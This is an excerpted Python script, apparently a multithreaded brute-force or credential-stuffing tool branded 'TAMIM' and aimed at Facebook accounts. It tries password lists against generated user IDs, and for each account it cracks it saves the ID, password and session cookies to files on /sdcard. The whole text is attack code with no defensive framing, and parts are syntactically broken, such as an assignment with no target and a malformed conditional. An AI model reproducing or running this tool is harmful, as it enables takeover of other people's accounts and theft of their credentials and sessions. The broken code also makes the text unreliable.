...
def getKey():
    = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid)
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as TAMIM:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                TAMIM.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TAMIM-M1] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m [TAMIM-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TAMIM_OK_ids_M1.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TAMIM_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #open('/sdcard/TAMIM-M1-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [TAMIM-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TAMIM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TAMIM-M2] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [TAMIM-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TAMIM_OK_ids_M2.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TAMIM_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              #  open('/sdcard/TAMIM-M2-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
...
def graph(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TAMIM-M3] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [TAMIM-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TAMIM_OK_ids_M3.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TAMIM_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                               # open('/sdcard/TAMIM-M3-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
...
def graph1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TAMIM-M4] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [TAMIM-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TAMIM_OK_ids_M4.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TAMIM_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                           #     open('/sdcard/TAMIM-M4-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [TAMIMbrand] %s /  OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [TAMIM-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TAMIM-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [TAMIM-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TAMIM-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
